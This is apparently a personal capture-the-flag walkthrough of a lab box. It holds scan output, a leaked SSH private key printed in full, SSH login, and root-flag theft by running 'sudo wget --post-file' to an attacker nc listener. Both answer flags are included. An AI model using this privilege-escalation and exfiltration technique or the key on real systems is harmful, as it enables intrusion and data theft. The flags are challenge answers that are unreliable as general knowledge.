---
Can you exfiltrate the root flag?
---

![|313](https://tryhackme-images.s3.amazonaws.com/room-icons/8116d1d52d3a63dd1e7c2e7ddce8a0d5.png)

Have fun with this easy box.

```
rustscan 22,80

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ feroxbuster --url http://10.10.128.118 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.128.118
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      378l      977w    11374c http://10.10.128.118/
200      GET      378l      977w    11374c http://10.10.128.118/index.html
301      GET        9l       28w      316c http://10.10.128.118/sitemap => http://10.10.128.118/sitemap/
301      GET        9l       28w      321c http://10.10.128.118/sitemap/.ssh => http://10.10.128.118/sitemap/.ssh/

view-source:http://10.10.128.118/
 <!-- Jessie don't forget to udate the webiste -->

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ curl -s http://10.10.128.118 

          <pre>
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf


 <!-- Jessie don't forget to udate the webiste -->
          </pre>

ssh jessie username

http://10.10.128.118/sitemap/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/wget_ctf]
└─$ nano key                      
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/wget_ctf]
└─$ chmod 600 key                          
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/wget_ctf]
└─$ ssh -i key jessie@10.10.128.118        
The authenticity of host '10.10.128.118 (10.10.128.118)' can't be established.
ED25519 key fingerprint is SHA256:6fAPL8SGCIuyS5qsSf25mG+DUJBUYp4syoBloBpgHfc.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.128.118' (ED25519) to the list of known hosts.
Load key "key": error in libcrypto
jessie@10.10.128.118's password: 

                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/wget_ctf]
└─$ ls
key

so create with id_rsa
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/wget_ctf]
└─$ rm key                       
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/wget_ctf]
└─$ nano id_rsa   
                                                                                                           
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/wget_ctf]
└─$ chmod 600 id_rsa
       
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker/wget_ctf]
└─$ ssh -i id_rsa jessie@10.10.128.118
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ 

jessie@CorpOne:~$ ls -la
total 112
drwxr-xr-x 17 jessie jessie 4096 oct 26  2019 .
drwxr-xr-x  3 root   root   4096 oct 26  2019 ..
lrwxrwxrwx  1 root   root      9 oct 26  2019 .bash_history -> /dev/null
-rw-r--r--  1 jessie jessie  220 oct 26  2019 .bash_logout
-rw-r--r--  1 jessie jessie 3771 oct 26  2019 .bashrc
drwx------ 13 jessie jessie 4096 oct 26  2019 .cache
drwx------ 15 jessie jessie 4096 oct 26  2019 .config
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 Desktop
-rw-r--r--  1 jessie jessie   25 oct 26  2019 .dmrc
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 Documents
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 Downloads
-rw-r--r--  1 jessie jessie 8980 oct 26  2019 examples.desktop
drwx------  2 jessie jessie 4096 oct 26  2019 .gconf
drwx------  3 jessie jessie 4096 oct 26  2019 .gnupg
-rw-------  1 jessie jessie  644 oct 26  2019 .ICEauthority
drwx------  3 jessie jessie 4096 oct 26  2019 .local
drwxr-xr-x  5 jessie jessie 4096 oct 26  2019 .mozilla
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 Music
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 Pictures
-rw-r--r--  1 jessie jessie  655 oct 26  2019 .profile
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 Public
drwx------  2 jessie jessie 4096 oct 26  2019 .ssh
-rw-r--r--  1 jessie jessie    0 oct 26  2019 .sudo_as_admin_successful
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 Templates
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 Videos
-rw-------  1 jessie jessie   52 oct 26  2019 .Xauthority
-rw-------  1 jessie jessie 1382 oct 26  2019 .xsession-errors
-rw-------  1 jessie jessie 1232 oct 26  2019 .xsession-errors.old
jessie@CorpOne:~$ ls -l Desktop
total 0
jessie@CorpOne:~$ ls -l Documents
total 4
-rw-rw-r-- 1 jessie jessie 33 oct 26  2019 user_flag.txt
jessie@CorpOne:~$ cat Documents/user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6

jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

using gtofbins wget
https://gtfobins.github.io/gtfobins/wget/

URL=http://attacker.com/file_to_get
LFILE=file_to_save
sudo wget $URL -O $LFILE

jessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 10.18.1.77:4444
--2022-09-22 20:57:51--  http://10.18.1.77:4444/
Connecting to 10.18.1.77:4444... connected.
HTTP request sent, awaiting response... 

┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -nlvp 4444                                   
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.128.118.
Ncat: Connection from 10.10.128.118:59730.
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.18.1.77:4444
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d

:)

```

User flag
*057c67131c3d5e42dd5cd3075b198ff6*

Root flag
*b1b968b37519ad1daa6408188649263d*

[[Mustacchio]]